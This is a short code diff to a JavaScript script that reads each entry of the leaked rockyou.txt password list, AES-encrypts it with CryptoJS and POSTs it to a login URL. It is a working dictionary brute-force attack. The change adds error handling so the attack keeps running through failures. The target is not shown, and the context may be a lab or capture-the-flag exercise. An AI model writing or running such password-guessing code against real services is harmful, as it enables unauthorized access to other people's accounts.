@@ -18,13 +18,18 @@ var data = {
 
 var array = fs.readFileSync("rockyou.txt").toString().split("\n");
 for (i in array) {
-  console.log("using password", array[i]);
-  data["password"] = CryptoJS.AES.encrypt(JSON.stringify(array[i]), key, {
-    format: CryptoJSAesJson,
-  }).toString();
+  try {
+    console.log("using password", array[i]);
+    data["password"] = CryptoJS.AES.encrypt(JSON.stringify(array[i]), key, {
+      format: CryptoJSAesJson,
+    }).toString();
 
-  var res = request("POST", url, {
-    json: data,
-  });
-  console.log(res.getBody().toString());
+    var res = request("POST", url, {
+      json: data,
+    });
+    console.log(res.getBody().toString());
+  } catch (e) {
+    console.error(e);
+    continue;
+  }
 }
